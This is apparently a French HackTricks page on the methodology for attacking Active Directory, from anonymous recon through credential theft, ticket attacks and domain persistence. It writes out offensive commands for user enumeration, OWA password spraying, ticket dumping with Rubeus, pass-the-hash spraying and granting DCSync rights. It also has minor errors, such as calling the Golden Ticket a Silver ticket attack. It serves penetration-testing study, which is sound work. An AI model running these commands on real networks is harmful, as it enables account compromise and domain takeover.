# Méthodologie Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Aperçu de base

**Active Directory** sert de technologie fondamentale, permettant aux **administrateurs réseau** de créer et gérer efficacement des **domaines**, des **utilisateurs** et des **objets** au sein d'un réseau. Il est conçu pour monter en charge, facilitant l'organisation d'un grand nombre d'utilisateurs en **groupes** et **sous-groupes** gérables, tout en contrôlant les **droits d'accès** à différents niveaux.

La structure d'**Active Directory** est composée de trois couches principales : **domains**, **trees**, et **forests**. Un **domain** englobe une collection d'objets, tels que des **utilisateurs** ou des **périphériques**, partageant une base de données commune. Les **trees** sont des groupes de ces domaines liés par une structure commune, et une **forest** représente la collection de plusieurs trees, interconnectés via des **trust relationships**, formant la couche la plus élevée de la structure organisationnelle. Des **droits d'accès** et de **communication** spécifiques peuvent être attribués à chacun de ces niveaux.

Les concepts clés d'**Active Directory** incluent :

1. **Directory** – Contient toutes les informations relatives aux objets Active Directory.
2. **Object** – Désigne les entités au sein de l'annuaire, incluant les **users**, **groups**, ou **shared folders**.
3. **Domain** – Sert de conteneur pour les objets de l'annuaire, avec la possibilité que plusieurs domains coexistent au sein d'une **forest**, chacun conservant sa propre collection d'objets.
4. **Tree** – Un regroupement de domains partageant un domaine racine commun.
5. **Forest** – Le sommet de la structure organisationnelle dans Active Directory, composé de plusieurs trees avec des **trust relationships** entre eux.

**Active Directory Domain Services (AD DS)** englobe une série de services essentiels pour la gestion centralisée et la communication au sein d'un réseau. Ces services comprennent :

1. **Domain Services** – Centralise le stockage des données et gère les interactions entre les **users** et les **domains**, incluant l'**authentication** et les fonctions de **search**.
2. **Certificate Services** – Supervise la création, la distribution et la gestion des **digital certificates** sécurisés.
3. **Lightweight Directory Services** – Prend en charge les applications compatibles annuaire via le **LDAP protocol**.
4. **Directory Federation Services** – Fournit des capacités de **single-sign-on** pour authentifier les utilisateurs à travers plusieurs applications web en une seule session.
5. **Rights Management** – Aide à protéger le contenu soumis aux droits d'auteur en régulant sa distribution et son utilisation non autorisées.
6. **DNS Service** – Crucial pour la résolution des **domain names**.

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Pour apprendre comment **attaquer un AD**, vous devez bien comprendre le **processus d'authentication Kerberos**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Feuille de référence

Vous pouvez consulter rapidement [https://wadcoms.github.io/](https://wadcoms.github.io) pour obtenir un aperçu des commandes à exécuter pour enumerer/exploiter un AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** pour effectuer des actions. Si vous tentez d'accéder à une machine via son adresse IP, **ce sera NTLM et non Kerberos**.

## Recon Active Directory (No creds/sessions)

Si vous avez simplement accès à un environnement AD mais que vous ne disposez d'aucun identifiants/sessions, vous pouvez :

- **Pentest the network:**
- Scanner le réseau, trouver les machines et ports ouverts et tenter d'**exploit vulnerabilities** ou d'**extract credentials** depuis celles-ci (par exemple, [les printers peuvent être des cibles très intéressantes](ad-information-in-printers.md)).
- L'énumération du DNS peut fournir des informations sur des serveurs clés du domaine comme web, printers, shares, vpn, media, etc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Consultez la page générale [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) pour plus d'informations sur la manière de procéder.
- **Check for null and Guest access on smb services** (cela ne fonctionnera pas sur les versions modernes de Windows) :
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Un guide plus détaillé sur la façon d'énumérer un serveur SMB est disponible ici :


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Un guide plus détaillé sur l'énumération LDAP est disponible ici (prêtez une **attention particulière à l'accès anonyme**) :


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Récupérer des credentials en **impersonating services with Responder** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Accéder à un hôte en [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Récupérer des credentials en **exposant** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html) :
- Extraire des usernames/noms depuis des documents internes, les réseaux sociaux, des services (principalement web) à l'intérieur des environnements de domaine ainsi que depuis les sources publiques.
- Si vous trouvez les noms complets des employés de l'entreprise, vous pouvez essayer différentes conventions de **username AD** (**[read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)**)**. Les conventions les plus courantes sont : _NameSurname_, _Name.Surname_, _NamSur_ (3 lettres de chaque), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _lettres aléatoires et 3 chiffres aléatoires_ (abc123).
- Outils :
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Consultez les pages [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) et [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum** : Lorsqu'un **username invalide est demandé**, le serveur répondra en utilisant le **Kerberos error** code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, ce qui nous permet de déterminer que le nom d'utilisateur est invalide. Les **usernames valides** provoqueront soit un **TGT in a AS-REP** en réponse, soit l'erreur _KRB5KDC_ERR_PREAUTH_REQUIRED_, indiquant que l'utilisateur doit effectuer une pré-authentication.
- **No Authentication against MS-NRPC** : En utilisant auth-level = 1 (No authentication) contre l'interface MS-NRPC (Netlogon) sur les domain controllers. La méthode appelle la fonction `DsrGetDcNameEx2` après avoir lié l'interface MS-NRPC pour vérifier si l'utilisateur ou l'ordinateur existe sans aucune credential. L'outil [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implémente ce type d'énumération. La recherche peut être trouvée [ici](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Si vous trouvez l'un de ces serveurs sur le réseau, vous pouvez également effectuer **user enumeration against it**. Par exemple, vous pouvez utiliser l'outil [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Vous pouvez trouver des listes de noms d'utilisateurs dans [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) et dans celui-ci ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Cependant, vous devriez disposer du **nom des personnes travaillant dans l'entreprise** à partir de l'étape de recon que vous auriez dû effectuer auparavant. Avec le prénom et le nom de famille vous pouvez utiliser le script [**namemash.py**](https://gist.github.com/superkojiman/11076951) pour générer des noms d'utilisateur potentiels valides.

### Knowing one or several usernames

Ok, donc vous savez déjà qu'un nom d'utilisateur est valide mais vous n'avez aucun mot de passe... Essayez alors :

- [**ASREPRoast**](asreproast.md) : Si un utilisateur **n'a pas** l'attribut _DONT_REQ_PREAUTH_ vous pouvez **demander un AS_REP message** pour cet utilisateur qui contiendra des données chiffrées par une dérivation du mot de passe de l'utilisateur.
- [**Password Spraying**](password-spraying.md) : Essayez les mots de passe les plus **communs** avec chacun des utilisateurs découverts, peut-être qu'un utilisateur utilise un mauvais mot de passe (gardez en tête la politique de mot de passe !).
- Notez que vous pouvez aussi **spray OWA servers** pour tenter d'accéder aux serveurs mail des utilisateurs.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Vous pourriez être capable d'**obtenir** certains **hashes** de challenge à cracker en **poisoning** certains protocoles du **network** :


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Si vous avez réussi à énumérer l'active directory vous aurez **plus d'emails et une meilleure compréhension du network**. Vous pourriez être en mesure de forcer des NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) pour accéder à l'AD env.

### Steal NTLM Creds

Si vous pouvez **accéder à d'autres PC ou shares** avec l'**null ou guest user** vous pourriez **placer des fichiers** (comme un fichier SCF) qui, s'ils sont consultés, vont t**rigger an NTLM authentication against you** afin que vous puissiez **steal** le **NTLM challenge** pour le cracker :


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Énumération d'Active Directory AVEC credentials/session

Pour cette phase vous devez avoir **compromis les credentials ou une session d'un compte de domaine valide.** Si vous avez des credentials valides ou un shell en tant qu'utilisateur de domaine, **n'oubliez pas que les options données précédemment restent des options pour compromettre d'autres utilisateurs**.

Avant de commencer l'énumération authentifiée vous devriez connaître le **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Énumération

Avoir compromis un compte est une **grande étape pour commencer à compromettre tout le domaine**, car vous allez pouvoir lancer l'**Active Directory Enumeration :**

Concernant [**ASREPRoast**](asreproast.md) vous pouvez maintenant trouver tous les utilisateurs potentiellement vulnérables, et concernant [**Password Spraying**](password-spraying.md) vous pouvez obtenir une **liste de tous les noms d'utilisateur** et essayer le mot de passe du compte compromis, des mots de passe vides et de nouveaux mots de passe prometteurs.

- Vous pourriez utiliser le [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Vous pouvez aussi utiliser [**powershell for recon**](../basic-powershell-for-pentesters/index.html) qui sera plus discret
- Vous pouvez également [**use powerview**](../basic-powershell-for-pentesters/powerview.md) pour extraire des informations plus détaillées
- Un autre outil incroyable pour le recon dans un active directory est [**BloodHound**](bloodhound.md). Il n'est **pas très stealthy** (selon les méthodes de collecte que vous utilisez), mais **si cela ne vous dérange pas**, vous devriez absolument l'essayer. Trouvez où les utilisateurs peuvent RDP, trouvez des chemins vers d'autres groupes, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) car ils peuvent contenir des informations intéressantes.
- Un **outil avec GUI** que vous pouvez utiliser pour énumérer l'annuaire est **AdExplorer.exe** de la suite **SysInternal**.
- Vous pouvez aussi rechercher dans la base LDAP avec **ldapsearch** pour chercher des credentials dans les champs _userPassword_ & _unixUserPassword_, ou même dans _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) pour d'autres méthodes.
- Si vous utilisez **Linux**, vous pourriez aussi énumérer le domaine en utilisant [**pywerview**](https://github.com/the-useless-one/pywerview).
- Vous pouvez aussi essayer des outils automatisés comme :
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extraction de tous les utilisateurs du domaine**

Il est très facile d'obtenir tous les noms d'utilisateur du domaine depuis Windows (`net user /domain` ,`Get-DomainUser` ou `wmic useraccount get name,sid`). Sous Linux, vous pouvez utiliser : `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ou `enum4linux -a -u "user" -p "password" <DC IP>`

> Même si cette section Enumeration paraît courte, c'est la partie la plus importante de toutes. Accédez aux liens (principalement ceux de cmd, powershell, powerview et BloodHound), apprenez à énumérer un domaine et entraînez-vous jusqu'à être à l'aise. Lors d'une évaluation, ce sera le moment clé pour trouver votre chemin vers DA ou pour décider qu'il n'y a rien à faire.

### Kerberoast

Kerberoasting implique l'obtention de **TGS tickets** utilisés par des services liés à des comptes utilisateurs et le cassage de leur chiffrement — qui est basé sur les mots de passe des utilisateurs — **offline**.

Plus d'informations dans :


{{#ref}}
kerberoast.md
{{#endref}}

### Connexion distante (RDP, SSH, FTP, Win-RM, etc)

Une fois que vous avez obtenu des credentials vous pouvez vérifier si vous avez accès à une **machine**. Pour cela, vous pouvez utiliser **CrackMapExec** pour tenter de vous connecter sur plusieurs serveurs avec différents protocoles, selon vos scans de ports.

### Local Privilege Escalation

Si vous avez compromis des credentials ou une session en tant qu'utilisateur de domaine standard et que vous avez **accès** avec cet utilisateur à **n'importe quelle machine du domaine** vous devriez essayer de trouver un moyen d'**escalader les privilèges localement et de piller des credentials**. C'est parce qu'uniquement avec des privilèges administrateur local vous pourrez **dump hashes d'autres utilisateurs** en mémoire (LSASS) et localement (SAM).

Il y a une page complète dans ce livre sur [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) et une [**checklist**](../checklist-windows-privilege-escalation.md). N'oubliez pas non plus d'utiliser [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Il est très **improbable** que vous trouviez des **tickets** dans l'utilisateur courant vous **donnant la permission d'accéder** à des ressources inattendues, mais vous pouvez vérifier :
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Si vous avez réussi à énumérer l'Active Directory vous disposerez de **plus d'emails et d'une meilleure compréhension du réseau**. Vous pourriez être capable de forcer NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Recherche de Creds dans les partages d'ordinateurs | SMB Shares

Maintenant que vous avez quelques credentials de base, vous devriez vérifier si vous pouvez **trouver** des **fichiers intéressants partagés dans l'AD**. Vous pouvez le faire manuellement mais c'est une tâche très ennuyante et répétitive (surtout si vous trouvez des centaines de docs à vérifier).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Si vous pouvez **accéder à d'autres PCs ou partages** vous pourriez **déposer des fichiers** (comme un fichier SCF) qui, s'ils sont accédés, vont **déclencher une authentification NTLM contre vous** afin que vous puissiez **voler** le **NTLM challenge** pour le cracker :


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Cette vulnérabilité permettait à tout utilisateur authentifié de **compromettre le domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Escalade de privilèges sur Active Directory AVEC des credentials/session privilégiés

**Pour les techniques suivantes un utilisateur de domaine ordinaire ne suffit pas, vous avez besoin de privilèges/credentials spéciaux pour effectuer ces attaques.**

### Extraction de hash

Espérons que vous avez réussi à **compromettre un compte local admin** en utilisant [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) incluant le relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Ensuite, il est temps d'extraire tous les hashes en mémoire et localement.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Une fois que vous avez le hash d'un utilisateur**, vous pouvez l'utiliser pour **vous faire passer pour lui**.\
Vous devez utiliser un **outil** qui **effectuera** l'**authentification NTLM en utilisant** ce **hash**, **ou** vous pouvez créer un nouveau **sessionlogon** et **injecter** ce **hash** dans le **LSASS**, ainsi lorsqu'une **authentification NTLM est effectuée**, ce **hash sera utilisé.** La dernière option est ce que fait mimikatz.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Cette attaque vise à **utiliser le hash NTLM de l'utilisateur pour demander des tickets Kerberos**, comme alternative au Pass The Hash courant via le protocole NTLM. Par conséquent, cela peut être particulièrement **utile dans des réseaux où le protocole NTLM est désactivé** et où seul **Kerberos est autorisé** comme protocole d'authentification.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Dans la méthode d'attaque **Pass The Ticket (PTT)**, les attaquants **volent le ticket d'authentification d'un utilisateur** au lieu de son mot de passe ou de ses valeurs de hash. Ce ticket volé est ensuite utilisé pour **se faire passer pour l'utilisateur**, obtenant un accès non autorisé aux ressources et services du réseau.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Si vous avez le **hash** ou le **password** d'un **local administrator** vous devriez essayer de **vous connecter localement** à d'autres **PCs** avec celui-ci.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Notez que ceci est assez **bruyant** et que **LAPS** l'**atténuerait**.

### MSSQL Abuse & Trusted Links

Si un utilisateur a les privilèges pour **accéder aux instances MSSQL**, il pourrait les utiliser pour **exécuter des commandes** sur l'hôte MSSQL (si celui-ci tourne en tant que SA), **voler** le **hash NetNTLM** ou même effectuer une **relay attack**.\
Aussi, si une instance MSSQL est trusted (database link) par une autre instance MSSQL. Si l'utilisateur a des privilèges sur la base de données trustée, il pourra **utiliser la relation de trust pour exécuter des requêtes également dans l'autre instance**. Ces trusts peuvent être chaînés et à un moment donné l'utilisateur pourrait trouver une base de données mal configurée où il peut exécuter des commandes.\
**The links between databases work even across forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Les suites tierces d'inventaire et de déploiement exposent souvent des chemins puissants vers des identifiants et l'exécution de code. Voir :

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Si vous trouvez un objet Computer avec l'attribut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) et que vous avez des privilèges de domaine sur la machine, vous pourrez dump des TGTs depuis la mémoire de tous les utilisateurs qui se connectent à l'ordinateur.\
Ainsi, si un **Domain Admin se connecte à la machine**, vous pourrez dumper son TGT et l'usurper en utilisant [Pass the Ticket](pass-the-ticket.md).\
Grâce à constrained delegation vous pourriez même **compromettre automatiquement un Print Server** (espérons que ce soit un DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Si un utilisateur ou un ordinateur est autorisé pour la "Constrained Delegation", il pourra **usurper n'importe quel utilisateur pour accéder à certains services sur une machine**.\
Ensuite, si vous **compromettez le hash** de cet utilisateur/ordinateur vous pourrez **usurper n'importe quel utilisateur** (même des Domain Admins) pour accéder à certains services.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Avoir le privilège **WRITE** sur un objet Active Directory d'un ordinateur distant permet d'obtenir l'exécution de code avec des **privilèges élevés** :


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

L'utilisateur compromis pourrait avoir des **privilèges intéressants sur certains objets du domaine** qui pourraient vous permettre de **mouvementer latéralement**/ **escalader** des privilèges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Découvrir un **service Spool à l'écoute** dans le domaine peut être **abusé** pour **acquérir de nouveaux identifiants** et **escalader des privilèges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Si **d'autres utilisateurs** **accèdent** à la machine **compromise**, il est possible de **récupérer des identifiants depuis la mémoire** et même **injecter des beacons dans leurs processus** pour les usurper.\
Généralement les utilisateurs accèdent au système via RDP, voici donc comment effectuer quelques attaques sur des sessions RDP tierces :


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** fournit un système pour gérer le mot de passe de l'**Administrateur local** sur des machines jointes au domaine, en s'assurant qu'il est **randomisé**, unique et fréquemment **changé**. Ces mots de passe sont stockés dans Active Directory et l'accès est contrôlé via des ACLs uniquement pour les utilisateurs autorisés. Avec des permissions suffisantes pour accéder à ces mots de passe, il devient possible de pivoter vers d'autres machines.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Récupérer des certificats** depuis la machine compromise peut être un moyen d'escalader des privilèges à l'intérieur de l'environnement :


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Si des **templates vulnérables** sont configurés, il est possible de les abuser pour escalader des privilèges :


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Une fois que vous obtenez des privilèges **Domain Admin** ou, encore mieux, **Enterprise Admin**, vous pouvez **dump** la base de données du domaine : _ntds.dit_.

[**Plus d'informations sur l'attaque DCSync ici**](dcsync.md).

[**Plus d'informations sur la façon de voler le NTDS.dit ici**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Certaines des techniques discutées précédemment peuvent être utilisées pour la persistance.\
Par exemple vous pourriez :

- Rendre des utilisateurs vulnérables à [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Rendre des utilisateurs vulnérables à [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Accorder des privilèges [**DCSync**](#dcsync) à un utilisateur

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

L'attaque **Silver Ticket** crée un **Ticket Granting Service (TGS)** légitime pour un service spécifique en utilisant le **NTLM hash** (par exemple, le **hash du compte PC**). Cette méthode est employée pour **accéder aux privilèges du service**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Une **attaque Golden Ticket** implique qu'un attaquant obtienne l'accès au **NTLM hash du compte krbtgt** dans un environnement Active Directory (AD). Ce compte est spécial car il est utilisé pour signer tous les **Ticket Granting Tickets (TGTs)**, essentiels pour l'authentification au sein du réseau AD.

Une fois que l'attaquant obtient ce hash, il peut créer des **TGTs** pour n'importe quel compte de son choix (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Ce sont similaires aux golden tickets, forgés d'une manière qui **contourne les mécanismes de détection courants des golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Posséder les certificats d'un compte ou pouvoir les demander** est un très bon moyen de persister sur le compte utilisateur (même s'il change son mot de passe) :


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Utiliser des certificats permet aussi de persister avec des privilèges élevés à l'intérieur du domaine :**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

L'objet **AdminSDHolder** dans Active Directory assure la sécurité des **groupes privilégiés** (comme Domain Admins et Enterprise Admins) en appliquant une **ACL** standard across ces groupes pour empêcher des modifications non autorisées. Cependant, cette fonctionnalité peut être exploitée ; si un attaquant modifie l'ACL d'AdminSDHolder pour donner un accès complet à un utilisateur régulier, cet utilisateur obtient un contrôle étendu sur tous les groupes privilégiés. Cette mesure de sécurité, destinée à protéger, peut donc se retourner contre l'environnement si elle n'est pas étroitement surveillée.

[**Plus d'informations sur AdminDSHolder Group ici.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

À l'intérieur de chaque **Domain Controller (DC)** existe un compte **Administrateur local**. En obtenant des droits admin sur une telle machine, le hash de l'Administrateur local peut être extrait avec **mimikatz**. Ensuite, une modification du registre est nécessaire pour **autoriser l'utilisation de ce mot de passe**, permettant un accès à distance au compte Administrateur local.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Vous pourriez **donner** des **permissions spéciales** à un **utilisateur** sur certains objets du domaine qui permettront à cet utilisateur **d'escalader des privilèges à l'avenir**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Les **security descriptors** sont utilisés pour **stocker** les **permissions** qu'**un objet** possède **sur** un autre **objet**. Si vous pouvez simplement **faire** un **petit changement** dans le **security descriptor** d'un objet, vous pouvez obtenir des privilèges très intéressants sur cet objet sans avoir besoin d'être membre d'un groupe privilégié.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Altérer **LSASS** en mémoire pour établir un **mot de passe universel**, accordant l'accès à tous les comptes du domaine.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Apprenez ce qu'est un SSP (Security Support Provider) ici.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Vous pouvez créer votre **propre SSP** pour **capturer en clair** les **identifiants** utilisés pour accéder à la machine.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Il enregistre un **nouveau Domain Controller** dans l'AD et l'utilise pour **pousser des attributs** (SIDHistory, SPNs...) sur des objets spécifiés **sans** laisser de **logs** concernant les **modifications**. Vous **avez besoin de privilèges DA** et d'être dans le **root domain**.\
Notez que si vous utilisez de mauvaises données, des logs assez visibles apparaîtront.

{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Précédemment, nous avons expliqué comment escalader des privilèges si vous avez **suffisamment de permissions pour lire les mots de passe LAPS**. Cependant, ces mots de passe peuvent aussi être utilisés pour **maintenir la persistance**.\
Consultez :


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft considère la **Forest** comme la frontière de sécurité. Cela implique que **la compromission d'un seul domaine pourrait potentiellement mener à la compromission de toute la Forest**.

### Basic Information

Un [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) est un mécanisme de sécurité qui permet à un utilisateur d'un **domaine** d'accéder aux ressources d'un autre **domaine**. Il crée essentiellement un lien entre les systèmes d'authentification des deux domaines, permettant aux vérifications d'authentification de circuler sans heurts. Lorsque des domaines établissent un trust, ils échangent et conservent des **clés** spécifiques dans leurs **Domain Controllers (DCs)**, qui sont cruciales pour l'intégrité du trust.

Dans un scénario typique, si un utilisateur souhaite accéder à un service dans un **domaine trusté**, il doit d'abord demander un ticket spécial connu sous le nom **inter-realm TGT** auprès du DC de son propre domaine. Ce TGT est chiffré avec une **clé de trust** partagée que les deux domaines ont convenue. L'utilisateur présente ensuite ce TGT au **DC du domaine trusté** pour obtenir un ticket de service (**TGS**). Après validation réussie de l'inter-realm TGT par le DC du domaine trusté, ce dernier délivre un TGS, accordant à l'utilisateur l'accès au service.

**Étapes** :

1. Un **poste client** dans le **Domain 1** démarre le processus en utilisant son **NTLM hash** pour demander un **Ticket Granting Ticket (TGT)** à son **Domain Controller (DC1)**.
2. DC1 émet un nouveau TGT si le client est authentifié avec succès.
3. Le client demande alors un **inter-realm TGT** à DC1, nécessaire pour accéder aux ressources du **Domain 2**.
4. L'inter-realm TGT est chiffré avec une **trust key** partagée entre DC1 et DC2 dans le cadre du trust bidirectionnel.
5. Le client apporte l'inter-realm TGT au **Domain Controller (DC2)** du Domain 2.
6. DC2 vérifie l'inter-realm TGT en utilisant sa trust key partagée et, si valide, émet un **Ticket Granting Service (TGS)** pour le serveur du Domain 2 auquel le client souhaite accéder.
7. Finalement, le client présente ce TGS au serveur, lequel est chiffré avec le hash du compte du serveur, pour obtenir l'accès au service dans le Domain 2.

### Different trusts

